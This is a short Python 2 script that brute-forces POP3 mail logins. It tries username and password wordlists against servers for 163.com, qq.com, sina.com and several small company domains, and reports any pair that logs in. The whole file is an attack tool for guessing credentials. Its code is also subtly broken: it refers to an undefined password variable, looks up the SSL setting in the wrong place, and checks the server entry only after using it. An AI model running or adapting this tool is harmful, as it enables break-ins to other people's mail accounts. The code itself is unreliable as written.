#!/usr/bin/env python
#-*- coding: UTF-8 -*-

'''
Check mail user.
'''

import poplib
import argparse

from lib.wordlist import WordList


MAILSERVERS = { '163.com':{'server':"pop3.163.com"},
                'qq.com':{'server':"pop.qq.com",'ssl':True,'port':995},
                'foxmail.com':{'server':"pop.qq.com"},
                'sina.com':{'server':"pop.sina.com"},
                'vmeti.com':{'server':"vmeti.com"},
                'netwayer.com':{'server':"netwayer.com"},
                'ehanlin.com':{'server':"123.108.216.97"},
                'sootoo.com':{'server':"mail.sootoo.com"},
            }

def checkMail(server,user,passwd,ssl=False,port=None):
    if not port:
        port = 995 if ssl else 110

    pop3 = poplib.POP3_SSL(server, port) if ssl else poplib.POP3(server, port)

    pop3.user(user)
    auth = pop3.pass_(passwd)
    pop3.quit()

    if "+OK" in auth:
        return True
    else:
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("user",help="specified the user of the mail account, use @file to specify user wordlist")
    parser.add_argument("passwd",help="specified the password of the mail account, use @file to specify password wordlist")
    parser.add_argument("-s","--server",help="specified the POP3 server.")  
    parser.add_argument("-c","--ssl",help="use ssl",action="store_true")
    parser.add_argument("-p","--port",help="specified the port",type=int)

    args = parser.parse_args()

    users = WordList(args.user[1:]) if args.user.startswith("@") else [args.user]
    passwords = WordList(args.passwd[1:]) if args.passwd.startswith("@") else [args.passwd]

    for user in users:
        for password in passwords:
            server = user.split("@")[1].strip()
            server = MAILSERVERS.get(server, None)
            ssl = MAILSERVERS.get('ssl', False)
            port = server.get('port',None)
            if not server:
                continue

            print "[+] checking '{0}' '{1}' '{2}'".format(user, passwd, server['server'])
            
            if checkMail(server['server'], user, passwd, ssl=ssl, port=port):
                print "[!] success, user is {0}, password is {1}".format(user,passwd)



    

